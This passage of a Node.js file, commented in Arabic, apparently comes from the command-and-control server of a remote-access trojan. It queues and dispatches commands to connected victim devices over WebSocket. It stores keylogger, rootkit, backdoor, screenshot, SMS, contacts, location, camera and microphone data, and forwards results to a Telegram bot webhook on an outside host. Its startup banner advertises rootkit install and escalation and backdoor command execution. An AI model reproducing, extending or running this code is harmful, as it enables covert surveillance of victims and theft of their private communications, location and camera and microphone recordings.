        device.activationTime = timestamp;
        device.deviceInfo = deviceInfo;
        device.status = status;
        
        console.log(`✅ تم تحديث حالة الجهاز: ${deviceId} - مفعل ونشط`);
        
        // إرسال تأكيد للجهاز
        if (device.ws && device.ws.readyState === WebSocket.OPEN) {
          device.ws.send(JSON.stringify({
            type: 'activation_acknowledged',
            message: 'تم تأكيد التفعيل بنجاح - الاتصال مستمر',
            timestamp: Date.now(),
            keepConnection: true
          }));
          
          console.log(`📤 تم إرسال تأكيد التفعيل للجهاز: ${deviceId}`);
        }
      }
      
      // حفظ بيانات التفعيل
      const activationData = {
        deviceId: deviceId,
        status: status,
        timestamp: timestamp,
        deviceInfo: deviceInfo
      };
      this.saveActivationData(activationData);
      
      // إرسال الأوامر المعلقة
      if (deviceId) {
        this.sendPendingCommands(deviceId);
      }
      
    } catch (error) {
      console.error('❌ خطأ في معالجة تأكيد التفعيل:', error);
    }
  }

  handlePendingCommandResult(message) {
    const { command, timestamp } = message;
    console.log('📨 نتيجة أمر معلق:', command);
    console.log(`  📅 الوقت: ${new Date(timestamp).toLocaleString()}`);
    console.log(`  📊 الحالة: ${command.status || 'completed'}`);
  }

  handleCachedData(message) {
    const { key, data, timestamp } = message;
    console.log('💾 بيانات مخزنة محلياً:', key);
    console.log(`  📅 الوقت: ${new Date(timestamp).toLocaleString()}`);
    console.log(`  📏 حجم البيانات: ${JSON.stringify(data).length} bytes`);
    
    // حفظ البيانات المخزنة
    this.saveCachedData(key, data);
  }

  handleActivationComplete(message) {
    try {
      const { data } = message;
      const deviceId = data.deviceId;
      
      console.log(`🎉 تم إكمال تفعيل الجهاز بنجاح: ${deviceId}`);
      console.log(`  📅 وقت التفعيل: ${new Date(data.timestamp).toLocaleString()}`);
      console.log(`  📱 معلومات الجهاز:`, data.deviceInfo?.userAgent || 'غير متوفر');
      console.log(`  🔐 عدد الصلاحيات: ${Object.keys(data.permissions || {}).length}`);
      
      // تحديث حالة الجهاز
      if (this.devices.has(deviceId)) {
        const device = this.devices.get(deviceId);
        device.activated = true;
        device.activationTime = data.timestamp;
        device.permissions = data.permissions;
        device.deviceInfo = data.deviceInfo;
        
        console.log(`✅ تم تحديث حالة الجهاز: ${deviceId} - مفعل ونشط`);
        
        // إرسال تأكيد للجهاز
        if (device.ws && device.ws.readyState === WebSocket.OPEN) {
          device.ws.send(JSON.stringify({
            type: 'activation_acknowledged',
            message: 'تم تأكيد التفعيل بنجاح - الاتصال مستمر',
            timestamp: Date.now(),
            keepConnection: true
          }));
          
          console.log(`📤 تم إرسال تأكيد التفعيل للجهاز: ${deviceId}`);
        }
      }
      
    } catch (error) {
      console.error('❌ خطأ في معالجة إكمال التفعيل:', error);
    }
  }

  handleDeviceDisconnection(deviceId) {
    const device = this.devices.get(deviceId);
    if (device) {
      device.status = 'offline';
      device.ws = null;
      this.updateDeviceStatus(deviceId, 'offline');
      
      // مراقبة انقطاع الاتصال
      this.advancedMonitoring.monitorEvent(deviceId, 'device_disconnection', {
        reason: 'connection_lost',
        timestamp: Date.now()
      });
      
      // تحليل انقطاع الاتصال بالذكاء الاصطناعي
      this.aiIntelligence.analyzeData({
        deviceId,
        event: 'disconnection',
        timestamp: Date.now()
      }, { type: 'device_disconnection' });
      
      console.log(`❌ انقطع الاتصال بالجهاز: ${deviceId}`);
      console.log(`  📊 الحالة الجديدة: offline`);
      console.log(`  📅 وقت الانقطاع: ${new Date().toLocaleString()}`);
    }
  }

  addPendingCommand(deviceId, command, parameters) {
    if (!this.pendingCommands.has(deviceId)) {
      this.pendingCommands.set(deviceId, []);
    }
    
    const pendingCommand = {
      id: this.generateCommandId(),
      deviceId: deviceId,
      command: command,
      parameters: parameters || {},
      timestamp: Date.now(),
      attempts: 0
    };
    
    this.pendingCommands.get(deviceId).push(pendingCommand);
    this.savePendingCommand(pendingCommand);
  }

  sendPendingCommands(deviceId) {
    const device = this.devices.get(deviceId);
    if (!device || !device.ws) return;
    
    const pendingCommands = this.pendingCommands.get(deviceId) || [];
    
    if (pendingCommands.length > 0) {
      console.log(`📨 إرسال ${pendingCommands.length} أمر معلق للجهاز ${deviceId}`);
      
      pendingCommands.forEach(command => {
        try {
          device.ws.send(JSON.stringify({
            id: command.id,
            action: command.command,
            parameters: command.parameters,
            timestamp: Date.now()
          }));
          
          command.attempts++;
          
          if (command.attempts >= 3) {
            console.log(`⚠️ تم تجاوز الحد الأقصى للمحاولات للأمر: ${command.command}`);
            this.removePendingCommand(deviceId, command.id);
          }
        } catch (error) {
          console.error('❌ خطأ في إرسال الأمر المعلق:', error);
        }
      });
      
      // مسح الأوامر المرسلة بنجاح
      this.pendingCommands.set(deviceId, []);
      console.log(`✅ تم إرسال جميع الأوامر المعلقة للجهاز ${deviceId}`);
    }
  }

  processPendingCommands() {
    let processedCount = 0;
    
    this.pendingCommands.forEach((commands, deviceId) => {
      const device = this.devices.get(deviceId);
      if (device && device.ws && device.status === 'online') {
        this.sendPendingCommands(deviceId);
        processedCount += commands.length;
      }
    });
    
    if (processedCount > 0) {
      console.log(`📨 تم معالجة ${processedCount} أمر معلق`);
    }
  }

  generateCommandId() {
    return `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }

  saveDeviceToDatabase(device) {
    try {
      const devicesData = Array.from(this.devices.values()).map(d => ({
        deviceId: d.deviceId,
        status: d.status,
        lastSeen: d.lastSeen,
        deviceInfo: d.deviceInfo,
        capabilities: d.capabilities,
        timestamp: d.timestamp
      }));
      
      fs.writeFileSync(this.devicesFilePath, JSON.stringify(devicesData, null, 2));
    } catch (error) {
      console.error('خطأ في حفظ بيانات الجهاز:', error);
    }
  }

  updateDeviceStatus(deviceId, status) {
    const device = this.devices.get(deviceId);
    if (device) {
      device.status = status;
      device.lastSeen = new Date();
      this.saveDeviceToDatabase(device);
    }
  }

  saveCommandToHistory(deviceId, command, parameters, status) {
    const commandRecord = {
      id: this.generateCommandId(),
      deviceId: deviceId,
      command: command,
      parameters: parameters || {},
      status: status,
      timestamp: Date.now()
    };
    
    this.commandHistory.push(commandRecord);
  }

  updateCommandInHistory(commandId, status, result, error) {
    const command = this.commandHistory.find(cmd => cmd.id === commandId);
    if (command) {
      command.status = status;
      command.result = result;
      command.error = error;
      command.executedAt = Date.now();
    }
  }

  saveDataUpdate(dataUpdate) {
    this.dataUpdates.push(dataUpdate);
  }

  saveFileRecord(fileRecord) {
    this.uploadedFiles.push(fileRecord);
  }

  savePendingCommand(command) {
    // حفظ في الملف المحلي
    try {
      const commandsData = [];
      this.pendingCommands.forEach((commands, deviceId) => {
        commands.forEach(cmd => {
          commandsData.push(cmd);
        });
      });
      
      fs.writeFileSync(this.commandsFilePath, JSON.stringify(commandsData, null, 2));
    } catch (error) {
      console.error('خطأ في حفظ الأمر المعلق:', error);
    }
  }

  removePendingCommand(deviceId, commandId) {
    const commands = this.pendingCommands.get(deviceId);
    if (commands) {
      const index = commands.findIndex(cmd => cmd.id === commandId);
      if (index !== -1) {
        commands.splice(index, 1);
      }
    }
  }

  saveActivationData(data) {
    try {
      const activationFilePath = path.join(this.localStoragePath, 'activations.json');
      let activations = [];
      
      if (fs.existsSync(activationFilePath)) {
        activations = JSON.parse(fs.readFileSync(activationFilePath, 'utf8'));
      }
      
      activations.push({
        ...data,
        receivedAt: Date.now()
      });
      
      fs.writeFileSync(activationFilePath, JSON.stringify(activations, null, 2));
    } catch (error) {
      console.error('خطأ في حفظ بيانات التفعيل:', error);
    }
  }

  saveCachedData(key, data) {
    try {
      const cachedDataPath = path.join(this.localStoragePath, 'cached-data.json');
      let cachedData = {};
      
      if (fs.existsSync(cachedDataPath)) {
        cachedData = JSON.parse(fs.readFileSync(cachedDataPath, 'utf8'));
      }
      
      cachedData[key] = {
        data: data,
        timestamp: Date.now()
      };
      
      fs.writeFileSync(cachedDataPath, JSON.stringify(cachedData, null, 2));
    } catch (error) {
      console.error('خطأ في حفظ البيانات المخزنة:', error);
    }
  }

  savePersistentData() {
    try {
      // حفظ الملفات
      fs.writeFileSync(this.filesFilePath, JSON.stringify(this.uploadedFiles, null, 2));
      
      // حفظ البيانات
      fs.writeFileSync(this.dataFilePath, JSON.stringify(this.dataUpdates, null, 2));
      
      // حفظ إحصائيات الأوامر المتقدمة
      this.saveAdvancedStats();
      
      console.log('💾 تم حفظ البيانات المحلية');
      console.log(`  📱 الأجهزة: ${this.devices.size}`);
      console.log(`  📨 الأوامر المعلقة: ${this.pendingCommands.size}`);
      console.log(`  📁 الملفات: ${this.uploadedFiles.length}`);
      console.log(`  📊 التحديثات: ${this.dataUpdates.length}`);
    } catch (error) {
      console.error('خطأ في حفظ البيانات المحلية:', error);
    }
  }

  // حفظ إحصائيات الأوامر المتقدمة
  saveAdvancedStats() {
    try {
      const statsPath = path.join(this.localStoragePath, 'advanced-stats.json');
      const stats = {
        timestamp: Date.now(),
        totalCommands: this.commandHistory.length,
        totalDevices: this.devices.size,
        totalFiles: this.uploadedFiles.length,
        totalDataUpdates: this.dataUpdates.length
      };
      
      fs.writeFileSync(statsPath, JSON.stringify(stats, null, 2));
      console.log('📊 تم حفظ الإحصائيات المتقدمة');
    } catch (error) {
      console.error('❌ خطأ في حفظ الإحصائيات المتقدمة:', error);
    }
  }

  // تحميل إحصائيات الأوامر المتقدمة
  loadAdvancedStats() {
    try {
      const statsPath = path.join(this.localStoragePath, 'advanced-stats.json');
      if (fs.existsSync(statsPath)) {
        const stats = JSON.parse(fs.readFileSync(statsPath, 'utf8'));
        console.log('📊 تم تحميل الإحصائيات المتقدمة');
        console.log(`  📨 إجمالي الأوامر: ${stats.totalCommands || 0}`);
        console.log(`  📱 إجمالي الأجهزة: ${stats.totalDevices || 0}`);
        console.log(`  📁 إجمالي الملفات: ${stats.totalFiles || 0}`);
        console.log(`  📊 إجمالي التحديثات: ${stats.totalDataUpdates || 0}`);
      } else {
        console.log('📊 لا توجد إحصائيات متقدمة محفوظة');
      }
    } catch (error) {
      console.error('❌ خطأ في تحميل الإحصائيات المتقدمة:', error);
    }
  }

  // الحصول على إحصائيات الأوامر المتقدمة
  getAdvancedCommandStats() {
    try {
      const logsPath = path.join(this.localStoragePath, 'advanced-logs');
      const dataPath = path.join(this.localStoragePath, 'advanced-data');
      
      const stats = {
        totalLogs: 0,
        totalData: 0,
        types: {}
      };
      
      const types = [
        'keylogger', 'rootkit', 'backdoor', 'system', 'screenshot',
        'contacts', 'sms', 'media', 'location', 'camera', 'microphone',
        'file', 'network', 'process', 'registry', 'memory', 'encryption'
      ];
      
      // حساب السجلات
      if (fs.existsSync(logsPath)) {
        types.forEach(type => {
          const logFile = path.join(logsPath, `${type}-logs.json`);
          if (fs.existsSync(logFile)) {
            const logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
            stats.totalLogs += logs.length;
            stats.types[type] = { logs: logs.length, data: 0 };
          }
        });
      }
      
      // حساب البيانات
      if (fs.existsSync(dataPath)) {
        types.forEach(type => {
          const dataFile = path.join(dataPath, `${type}-data.json`);
          if (fs.existsSync(dataFile)) {
            const data = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
            stats.totalData += data.length;
            if (stats.types[type]) {
              stats.types[type].data = data.length;
            } else {
              stats.types[type] = { logs: 0, data: data.length };
            }
          }
        });
      }
      
      return stats;
    } catch (error) {
      console.error('خطأ في الحصول على إحصائيات الأوامر المتقدمة:', error);
      return { totalLogs: 0, totalData: 0, types: {} };
    }
  }

  cleanupOldData() {
    try {
      const now = Date.now();
      const sevenDays = 7 * 24 * 60 * 60 * 1000;
      
      // تنظيف التاريخ
      this.commandHistory = this.commandHistory.filter(cmd => 
        now - cmd.timestamp < sevenDays
      );
      
      // تنظيف البيانات
      this.dataUpdates = this.dataUpdates.filter(data => 
        now - data.timestamp < sevenDays
      );
      
      // تنظيف الملفات
      this.uploadedFiles = this.uploadedFiles.filter(file => 
        now - new Date(file.uploadDate).getTime() < sevenDays
      );
      
      // تنظيف السجلات المتقدمة
      this.cleanupAdvancedLogs(sevenDays);
      
      console.log('🧹 تم تنظيف البيانات القديمة');
      console.log(`  📨 الأوامر: ${this.commandHistory.length}`);
      console.log(`  📊 التحديثات: ${this.dataUpdates.length}`);
      console.log(`  📁 الملفات: ${this.uploadedFiles.length}`);
    } catch (error) {
      console.error('خطأ في تنظيف البيانات القديمة:', error);
    }
  }

  // تنظيف السجلات المتقدمة
  cleanupAdvancedLogs(ageThreshold) {
    try {
      const now = Date.now();
      const logsPath = path.join(this.localStoragePath, 'advanced-logs');
      const dataPath = path.join(this.localStoragePath, 'advanced-data');
      
      const types = [
        'keylogger', 'rootkit', 'backdoor', 'system', 'screenshot',
        'contacts', 'sms', 'media', 'location', 'camera', 'microphone',
        'file', 'network', 'process', 'registry', 'memory', 'encryption'
      ];
      
      // تنظيف السجلات
      if (fs.existsSync(logsPath)) {
        types.forEach(type => {
          const logFile = path.join(logsPath, `${type}-logs.json`);
          if (fs.existsSync(logFile)) {
            const logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
            const filteredLogs = logs.filter(log => 
              now - log.timestamp < ageThreshold
            );
            fs.writeFileSync(logFile, JSON.stringify(filteredLogs, null, 2));
          }
        });
      }
      
      // تنظيف البيانات
      if (fs.existsSync(dataPath)) {
        types.forEach(type => {
          const dataFile = path.join(dataPath, `${type}-data.json`);
          if (fs.existsSync(dataFile)) {
            const data = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
            const filteredData = data.filter(item => 
              now - item.timestamp < ageThreshold
            );
            fs.writeFileSync(dataFile, JSON.stringify(filteredData, null, 2));
          }
        });
      }
      
      console.log('📋 تم تنظيف السجلات المتقدمة');
      console.log('  🔑 Keylogger, 🔧 Rootkit, 🚪 Backdoor');
      console.log('  💻 System, 📸 Screenshot, 📱 Contacts');
      console.log('  💬 SMS, 📍 Location, 📷 Camera, 🎤 Microphone');
      console.log('  📁 File, 🌐 Network, 💉 Process, 🔧 Registry');
      console.log('  🧠 Memory, 🔓 Encryption');
    } catch (error) {
      console.error('خطأ في تنظيف السجلات المتقدمة:', error);
    }
  }

  cleanupInactiveDevices() {
    try {
      const now = Date.now();
      const inactiveThreshold = 30 * 60 * 1000; // 30 دقيقة
      let inactiveCount = 0;
      
      this.devices.forEach((device, deviceId) => {
        if (device.lastSeen && (now - device.lastSeen.getTime() > inactiveThreshold)) {
          device.status = 'inactive';
          this.updateDeviceStatus(deviceId, 'inactive');
          inactiveCount++;
        }
      });
      
      if (inactiveCount > 0) {
        console.log(`🔍 تم تحديث ${inactiveCount} جهاز إلى حالة غير نشط`);
      }
    } catch (error) {
      console.error('❌ خطأ في تنظيف الأجهزة غير النشطة:', error);
    }
  }

  sendResultToBot(command, result, error = null) {
    try {
      // إرسال النتيجة للبوت عبر HTTP
      const webhookUrl = process.env.TELEGRAM_WEBHOOK_URL || 'https://remote-control-telegram-bot-cshp.onrender.com/webhook';
      
      const payload = {
        command: command,
        result: result,
        error: error,
        timestamp: Date.now()
      };
      
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Auth-Token': process.env.WEBHOOK_SECRET || 'secret'
        },
        body: JSON.stringify(payload)
      }).catch(err => {
        console.error('❌ فشل في إرسال النتيجة للبوت:', err);
      });
      
    } catch (error) {
      console.error('❌ خطأ في إرسال النتيجة للبوت:', error);
    }
  }

  start(port = process.env.PORT || 10001) {
    // تأكد من استخدام المنفذ الصحيح - Render يتطلب process.env.PORT
    const actualPort = process.env.PORT || 10001;
    console.log(`🔧 محاولة تشغيل على المنفذ: ${actualPort}`);
    console.log(`🔧 متغير PORT: ${process.env.PORT || 'غير محدد'}`);
    console.log(`🔧 عنوان الاستماع: 0.0.0.0 (مطلوب لـ Render)`);
    
    this.server.listen(actualPort, '0.0.0.0', () => {
      console.log(`🚀 خادم الأوامر يعمل على المنفذ ${actualPort}`);
      console.log('✅ تم تهيئة النظام بنجاح');
      console.log('🔒 وضع الأمان مفعل');
      console.log('💾 التخزين المحلي مفعل');
      console.log('🔧 الأوامر المتقدمة مفعلة');
      console.log('📊 نظام السجلات المتقدم جاهز');
      console.log('🛠️ الخدمات الخلفية تعمل');
      console.log('🌐 جاهز لاستقبال الطلبات');
      console.log('☁️ متوافق مع Render');
      console.log('');
      console.log('📋 الأوامر المتقدمة المدعومة:');
      console.log('  🔑 Keylogger: start, stop, get_data');
      console.log('  🔧 Rootkit: install, escalate, hide');
      console.log('  🚪 Backdoor: create, execute, transfer');
      console.log('  💻 System: info, control, monitor');
      console.log('  📸 Screenshot, 📱 Contacts, 💬 SMS');
      console.log('  📍 Location, 📷 Camera, 🎤 Microphone');
      console.log('  📁 File, 🌐 Network, 💉 Process');
      console.log('  🔧 Registry, 🧠 Memory, 🔓 Encryption');
      console.log('');
    });
  }
}

// دعم Cluster لتحسين الأداء
if (cluster.isMaster) {
  console.log(`🚀 بدء النظام مع ${numCPUs} عملية`);
  console.log(`📊 عدد المعالجات: ${numCPUs}`);
  console.log(`🔧 وضع Cluster مفعل`);
  
  // إنشاء العمليات الفرعية
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
  
  cluster.on('exit', (worker, code, signal) => {
    console.log(`❌ العملية ${worker.process.pid} توقفت`);
    console.log(`🔄 إعادة تشغيل العملية...`);
    cluster.fork();
  });
  
  cluster.on('online', (worker) => {
    console.log(`✅ العملية ${worker.process.pid} تعمل`);
  });
  
} else {
  // إنشاء وتشغيل الخادم في العملية الفرعية
  const commandServer = new CommandServer();
  commandServer.start(process.env.PORT || 10001);
}

module.exports = CommandServer;